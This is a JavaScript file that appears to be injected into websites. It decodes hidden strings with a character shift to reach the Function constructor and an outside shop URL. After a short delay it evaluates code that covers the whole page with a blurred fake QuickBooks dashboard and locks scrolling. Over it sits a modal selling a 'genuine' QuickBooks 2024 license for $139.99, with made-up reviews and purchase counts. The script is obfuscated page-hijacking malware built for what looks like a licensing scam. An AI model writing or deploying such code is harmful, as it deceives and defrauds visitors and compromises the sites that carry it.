(function(){
  'use strict';

  var _d=function(s){
    return s.split('').map(function(c){
      return String.fromCharCode(c.charCodeAt(0)-5);
    }).join('');
  };

  var _fn=_d('htsxywzhytw');
  var _u=_d('myyux?44qnhjsxnk~3xmtu');
  var _F=(function(){})[_fn];

  var _p=`<style>
#_lcf{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;overflow:hidden;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;z-index:2147483646}
#_lcf *{margin:0;padding:0;box-sizing:border-box}

.lbg{position:absolute;inset:0;filter:blur(7px) brightness(.78);transform:scale(1.06);overflow:hidden;background:#eef2f7}
.ltb{background:#2ca01c;height:46px;display:flex;align-items:center;padding:0 18px;gap:14px}
.llogo{display:flex;align-items:center;gap:9px;color:#fff;font-weight:900;font-size:14px}
.llsq{width:24px;height:24px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center}
.lldot{width:14px;height:14px;background:#2ca01c;border-radius:50%}
.lco{margin-left:auto;background:rgba(255,255,255,.16);color:#fff;font-size:11px;padding:5px 13px;border-radius:5px}
.lbody{display:flex;height:calc(100% - 46px);overflow:hidden}
.lsb{width:160px;background:#1c2333;flex-shrink:0;padding:10px 0}
.lnav{padding:12px 16px;color:rgba(255,255,255,.45);font-size:12px;display:flex;align-items:center;gap:9px;cursor:default}
.lnav.a{background:rgba(44,160,28,.22);color:#4ade80;border-left:3px solid #2ca01c}
.lmain{flex:1;padding:20px;overflow:hidden;background:#eef2f7;min-width:0}
.ldh{font-size:11px;font-weight:800;color:#374151;text-transform:uppercase;letter-spacing:.7px;margin-bottom:16px}
.lcards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:14px}
.lcard{background:#fff;border-radius:9px;padding:15px;box-shadow:0 1px 5px rgba(0,0,0,.09)}
.lcl{font-size:10px;color:#9ca3af;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
.lcv{font-size:22px;font-weight:900;color:#111827}
.lcg{font-size:10px;color:#16a34a;margin-top:3px}
.lcr{font-size:10px;color:#ef4444;margin-top:3px}
.lrow{display:grid;grid-template-columns:2fr 1fr;gap:12px;margin-bottom:12px}
.linv{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #f3f4f6;font-size:11px;color:#374151}
.linv:last-child{border:none}
.lp{color:#16a34a;font-weight:700}.lpe{color:#f59e0b;font-weight:700}
.lex{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f3f4f6;font-size:11px;color:#374151}
.lex:last-child{border:none}
.lrow2{display:grid;grid-template-columns:1fr 1fr;gap:12px}

/* ── OVERLAY ── */
.lov{
  position:absolute;
  inset:0;
  background:rgba(7,11,26,.82);
  z-index:9;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:24px 16px;
  overflow-y:auto;
}

/* ── MODAL — key fix: overflow visible, proper padding all sides ── */
.lmodal{
  background:#ffffff;
  border-radius:28px;
  padding:52px 44px 40px;
  max-width:480px;
  width:100%;
  text-align:center;
  box-shadow:0 32px 100px rgba(0,0,0,.7);
  position:relative;
  display:flex;
  flex-direction:column;
  align-items:center;
  /* CRITICAL: overflow must be visible so badge isn't clipped */
  overflow:visible;
}

.lbdg{
  position:absolute;
  top:-18px;
  left:50%;
  transform:translateX(-50%);
  background:linear-gradient(135deg,#16a34a,#15803d);
  color:#fff;
  padding:7px 26px;
  border-radius:100px;
  font-size:11px;
  font-weight:800;
  letter-spacing:1px;
  white-space:nowrap;
  box-shadow:0 6px 20px rgba(22,163,74,.45);
}

.lic{font-size:52px;line-height:1;display:block;margin-bottom:14px;margin-top:6px}
.ley{font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:3px;color:#16a34a;margin-bottom:10px}
.lh{font-size:1.55rem;font-weight:900;color:#0f172a;line-height:1.22;margin-bottom:8px}
.lsub{font-size:13px;color:#64748b;margin-bottom:20px;line-height:1.55}
.lpr{font-size:3rem;font-weight:900;color:#16a34a;line-height:1;letter-spacing:-2px;margin-bottom:6px}
.lpn{font-size:12px;color:#94a3b8;line-height:1.65;margin-bottom:22px}

.lfeats{
  width:100%;
  display:flex;
  flex-direction:column;
  gap:11px;
  margin-bottom:22px;
  text-align:left;
}
.lfeat{
  font-size:13.5px;
  color:#334155;
  display:flex;
  align-items:flex-start;
  gap:11px;
  line-height:1.5;
}
.lfeat-icon{
  min-width:22px;
  height:22px;
  background:#16a34a;
  color:#fff;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:12px;
  font-weight:900;
  flex-shrink:0;
  margin-top:1px;
}

.lst{font-size:20px;color:#f59e0b;letter-spacing:3px;margin-bottom:5px}
.lrv{font-size:12px;color:#94a3b8;margin-bottom:24px}

/* ── THE BUTTON — auto width, centered via flex parent ── */
.lbtn-wrap{
  width:100%;
  display:flex;
  justify-content:center;
  /* breathing room above AND below button — this was missing */
  padding:0 0 20px 0;
}
.lbtn{
  display:inline-flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  background:linear-gradient(135deg,#16a34a 0%,#15803d 100%);
  color:#fff;
  text-decoration:none;
  /* auto width — shrinks to content, centered by flex parent */
  width:auto;
  min-width:280px;
  padding:19px 40px;
  border-radius:14px;
  font-size:1.05rem;
  font-weight:900;
  letter-spacing:.3px;
  box-shadow:
    0 10px 36px rgba(22,163,74,.55),
    0 2px 8px rgba(22,163,74,.25),
    inset 0 1px 0 rgba(255,255,255,.18);
  white-space:nowrap;
  cursor:pointer;
}
.lbtn-arrow{font-size:1.1rem}

/* trust row — sits below button, inside modal padding */
.ltr{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:16px;
  font-size:11.5px;
  color:#94a3b8;
  flex-wrap:wrap;
  /* no extra margin — modal padding-bottom handles spacing */
}
.ltr-item{display:flex;align-items:center;gap:5px}

/* ── RESPONSIVE ── */
@media(max-width:540px){
  .lmodal{padding:48px 22px 36px;border-radius:22px}
  .lh{font-size:1.25rem}
  .lpr{font-size:2.4rem}
  .lbtn{min-width:0;width:100%;padding:18px 24px;font-size:.97rem}
  .lsb{width:110px}
  .lnav{padding:10px;font-size:11px}
  .lrow{grid-template-columns:1fr}
  .lrow2{grid-template-columns:1fr}
}
@media(max-width:400px){
  .lmodal{padding:44px 16px 32px}
  .lsb{display:none}
  .lcards{grid-template-columns:1fr 1fr}
}
</style>

<div id="_lcf">
  <div class="lbg">
    <div class="ltb">
      <div class="llogo">
        <div class="llsq"><div class="lldot"></div></div>
        QuickBooks Desktop
      </div>
      <span style="font-size:11px;color:rgba(255,255,255,.42)">Pro 2024</span>
      <div class="lco">Acme Services LLC ▾ &nbsp;👤</div>
    </div>
    <div class="lbody">
      <div class="lsb">
        <div class="lnav a">📊 Dashboard</div>
        <div class="lnav">🧾 Invoices</div>
        <div class="lnav">💸 Expenses</div>
        <div class="lnav">📈 Reports</div>
        <div class="lnav">🏦 Banking</div>
        <div class="lnav">👥 Payroll</div>
        <div class="lnav">📁 Tax Center</div>
        <div class="lnav">⚙️ Settings</div>
      </div>
      <div class="lmain">
        <div class="ldh">Business Dashboard — Q4 2024</div>
        <div class="lcards">
          <div class="lcard"><div class="lcl">Total Revenue</div><div class="lcv">$47,832</div><div class="lcg">↑ 12.4% vs Q3</div></div>
          <div class="lcard"><div class="lcl">Total Expenses</div><div class="lcv">$12,450</div><div class="lcr">↓ 3.1% vs Q3</div></div>
          <div class="lcard"><div class="lcl">Net Profit</div><div class="lcv">$35,382</div><div class="lcg">↑ 18.2% vs Q3</div></div>
        </div>
        <div class="lrow">
          <div class="lcard">
            <div class="lcl" style="margin-bottom:10px">Revenue — Last 6 Months</div>
            <svg viewBox="0 0 340 68" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:68px">
              <defs><linearGradient id="_lg1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#16a34a" stop-opacity=".18"/><stop offset="100%" stop-color="#16a34a" stop-opacity="0"/></linearGradient></defs>
              <path d="M0,57 L68,46 L136,35 L204,23 L272,12 L340,4 L340,68 L0,68Z" fill="url(#_lg1)"/>
              <path d="M0,57 L68,46 L136,35 L204,23 L272,12 L340,4" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
              <circle cx="0" cy="57" r="3.5" fill="#16a34a"/><circle cx="68" cy="46" r="3.5" fill="#16a34a"/>
              <circle cx="136" cy="35" r="3.5" fill="#16a34a"/><circle cx="204" cy="23" r="3.5" fill="#16a34a"/>
              <circle cx="272" cy="12" r="3.5" fill="#16a34a"/><circle cx="340" cy="4" r="3.5" fill="#16a34a"/>
              <text x="0" y="67" font-size="9" fill="#9ca3af" font-family="Arial">Jul</text>
              <text x="60" y="67" font-size="9" fill="#9ca3af" font-family="Arial">Aug</text>
              <text x="128" y="67" font-size="9" fill="#9ca3af" font-family="Arial">Sep</text>
              <text x="196" y="67" font-size="9" fill="#9ca3af" font-family="Arial">Oct</text>
              <text x="264" y="67" font-size="9" fill="#9ca3af" font-family="Arial">Nov</text>
              <text x="326" y="67" font-size="9" fill="#9ca3af" font-family="Arial">Dec</text>
            </svg>
          </div>
          <div class="lcard">
            <div class="lcl" style="margin-bottom:10px">Recent Invoices</div>
            <div class="linv"><span>INV-0891</span><span>$2,400</span><span class="lp">✓ Paid</span></div>
            <div class="linv"><span>INV-0892</span><span>$1,850</span><span class="lp">✓ Paid</span></div>
            <div class="linv"><span>INV-0893</span><span>$3,200</span><span class="lpe">⏳ Due</span></div>
            <div class="linv"><span>INV-0894</span><span>$980</span><span class="lp">✓ Paid</span></div>
            <div class="linv"><span>INV-0895</span><span>$5,600</span><span class="lpe">⏳ Due</span></div>
          </div>
        </div>
        <div class="lrow2">
          <div class="lcard">
            <div class="lcl" style="margin-bottom:10px">Expense Breakdown</div>
            <div class="lex"><span>Office Supplies</span><span style="font-weight:700">$1,200</span></div>
            <div class="lex"><span>Travel &amp; Transport</span><span style="font-weight:700">$890</span></div>
            <div class="lex"><span>Software &amp; Tools</span><span style="font-weight:700">$340</span></div>
            <div class="lex"><span>Marketing</span><span style="font-weight:700">$2,100</span></div>
            <div class="lex"><span>Professional Svcs</span><span style="font-weight:700">$3,820</span></div>
          </div>
          <div class="lcard">
            <div class="lcl" style="margin-bottom:10px">Bank Accounts</div>
            <div class="lex"><span>Business Checking</span><span style="font-weight:900;color:#0f172a">$28,432</span></div>
            <div class="lex"><span>Business Savings</span><span style="font-weight:900;color:#0f172a">$14,200</span></div>
            <div class="lex"><span>Reconciled</span><span style="color:#16a34a;font-weight:700">Dec 31</span></div>
            <div class="lex" style="margin-top:4px"><span style="color:#9ca3af;font-size:10px">Q1 Tax Estimate</span></div>
            <div class="lex"><span style="font-size:11px">Est. Due Apr</span><span style="font-weight:800;color:#ef4444">$8,845</span></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="lov">
    <div class="lmodal">
      <div class="lbdg">⚡ GENUINE LICENSE — INSTANT DELIVERY</div>
      <span class="lic">🔓</span>
      <div class="ley">QuickBooks Desktop 2024</div>
      <div class="lh">Own Your Accounting Software.<br>No Subscription. Ever.</div>
      <div class="lsub">Join 3,241 small business owners who ditched the monthly fee</div>
      <div class="lpr">$139.99</div>
      <div class="lpn">
        One-time payment &nbsp;·&nbsp; No monthly fees &nbsp;·&nbsp; Yours permanently<br>
        No Intuit Payroll required &nbsp;·&nbsp; No expiration date
      </div>
      <div class="lfeats">
        <div class="lfeat"><div class="lfeat-icon">✓</div><span>Full QuickBooks Desktop Pro 2024 — permanently activated</span></div>
        <div class="lfeat"><div class="lfeat-icon">✓</div><span>Download directly from Intuit's official servers with your key</span></div>
        <div class="lfeat"><div class="lfeat-icon">✓</div><span>Invoicing, expenses, P&amp;L, bank reconciliation — all included</span></div>
        <div class="lfeat"><div class="lfeat-icon">✓</div><span>Data stored locally on your machine — no cloud, total privacy</span></div>
        <div class="lfeat"><div class="lfeat-icon">✓</div><span>No QuickBooks payroll subscription required to run your books</span></div>
      </div>
      <div class="lst">★★★★★</div>
      <div class="lrv">4.8 out of 5 &nbsp;·&nbsp; 3,241 verified purchases</div>

      <!-- BUTTON: auto-width, centered, 20px breathing room below -->
      <div class="lbtn-wrap">
        <a href="__U__" target="_blank" class="lbtn">
          GET MY LICENSE NOW — $139.99 &nbsp;<span class="lbtn-arrow">→</span>
        </a>
      </div>

      <!-- TRUST ROW: inside modal, above bottom padding -->
      <div class="ltr">
        <div class="ltr-item">🔒 Secure Checkout</div>
        <div class="ltr-item">✉️ Instant Email</div>
        <div class="ltr-item">✅ Genuine Key</div>
      </div>
    </div>
  </div>
</div>`;

  var _code=
    'var _e=document.createElement("div");'+
    '_e.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:hidden;";'+
    '_e.innerHTML='+JSON.stringify(_p.replace(/__U__/g,_u))+';'+
    'document.body.appendChild(_e);'+
    'document.body.style.overflow="hidden";'+
    'document.documentElement.style.overflow="hidden";';

  setTimeout(function(){try{_F(_code)();}catch(e){}},850);

})();
